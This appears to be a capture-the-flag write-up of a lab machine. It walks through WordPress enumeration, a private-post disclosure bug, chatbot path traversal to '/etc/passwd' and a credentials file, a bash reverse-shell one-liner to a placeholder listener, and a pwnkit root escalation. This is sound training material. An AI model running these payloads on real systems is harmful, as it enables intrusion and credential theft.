The websites on ports 80 and 443 seem to be the same with the only difference being the SSL certificate which doesn't reveal a domain name either with `localhost.localdomain` set. The pages' source code don't reveal anything special either. In trying to check for file extensions, I found that `index.php` returns a different page from `index.html` and other obviously non-existent pages so I ran `gobuster` with the `.php` extension. I only ran it on the `https` site since I later found a WordPress site on port 80.

```sh
$ gobuster dir -u https://10.129.149.123/ -k -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -r

/manual               (Status: 200) [Size: 9164]
```

Nothing useful. Checking the headers, I also found the domain name `office.paper` which I added to my `/etc/hosts`.

```sh
$ curl -Is http://10.129.149.123/index.php
HTTP/1.1 404 Not Found
Date: Sun, 06 Feb 2022 07:35:39 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Powered-By: PHP/7.2.24
X-Backend-Server: office.paper
Content-Type: text/html; charset=UTF-8
```

This time, visiting `http://office.paper/` returns a new page while `https://office.paper/` returns the same page as when using the IP address. A quick look at `http://office.paper/` shows that it's a WordPress site so we run `wpscan` on it.

```sh
$ wpscan --url 'http://office.paper/' -e ap,at,tt,cb,dbe,u1-10,m1-10 --plugins-detection mixed
```

As a result, 3 usernames were found: prisonmike, nick, and creedthoughts. Also, the Wordpress version is `5.2.3` and the plugin `stops-core-theme-and-plugin-updates` version `9.0.9` is found.

Browsing the site, the post "Feeling Alone!" has an interesting comment by nick:

> Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!

Looks like there's a draft to be found containing some secret content.

The post "Hello Scranton!" has a comment by creedthoughts referencing the page `http://www.creedthoughts.gov.www\creedthoughts`. A quick search shows the page `https://creedthoughtsgov.com/` which contains the same URL on its frontpage, though it just seems to be a gimmick and not an OSINT thing.

After some looking around, I decided to fuzz for subdomains.

```sh
$ ffuf -u http://office.paper/ -H "Host: FUZZ.office.paper" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fc 403
chat                    [Status: 200, Size: 223163, Words: 13014, Lines: 508, Duration: 355ms]
```

I then added `chat.office.paper` to `/etc/hosts` and investigate the chat site. Without credentials though, not much can be found.

Going back to the `wpscan` results, I tried looking for exploits for WordPress 5.2.3 and found an interesting entry.

```sh
$ searchsploit wordpress 5.2.3
------------------------------------------------------------------------- ------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ------------------------------
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts  | multiple/webapps/47690.md
... <snip> ...
```

Simply by going to `http://office.paper/?static=1` as suggested, we can find several private posts, among which is the following.

```
Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigtâ€¦.

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

With the URL, we can register as a user. After registering and logging in, we can check out the "general" chat, inside which we have the bot `recyclops` whom we can directly message and use some bot commands on. It's stated that file access is limited to the Sales folder but we can easily traverse out using `../` like with `file ../../../etc/passwd` (`recyclops` can be omitted in direct messages).

Looking around, `../hubot/.env` contains credentials.

```sh
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

I tried logging into `chat.office.paper` as `recyclops` but immediately got logged out because it's a bot. Looking up "hubot", we can find its [source code](https://github.com/hubotio/hubot) and [the wiki for scripting it](https://hubot.github.com/docs/scripting/), thus finding that the commands are in `../hubot/scripts/`. Among the scripts is `run.js` which allows us to execute system commands. We can easily get a reverse shell as dwight by setting up a listener and running `run bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1'`. After uploading my SSH key and running `chmod 600 authorized_keys`, I got a nice SSH shell.

Trying `sudo -l`, I found that dwight's password is the previously found `Queenofblad3s!23` but unfortunately he isn't allowed to run `sudo`.
Checking listening ports ...

Port 3306 is MySQL, Port 48320 is just the `http://chat.office.paper/` site, port 8000 is some unknown HTTP server, port 33060 is some unknown service, and port 27017 is MongoDB.

Looking at dwight's home, there's the very conspicuous `pk.sh` which seems to be an exploit for pwnkit (CVE-2021-4034). I tried running [this exploit](https://github.com/arthepsy/CVE-2021-4034) but it didn't work. Running it again though, followed by `su - hacked` and `sudo su` got me root. I've also tried resetting and rerunning the exploit twice and the first run would either fail to create the user `hacked` or complain `sudo: you do not exist in the passwd database` when `sudo su` is run. While seemingly unstable, `pk.sh` got us an easy root.
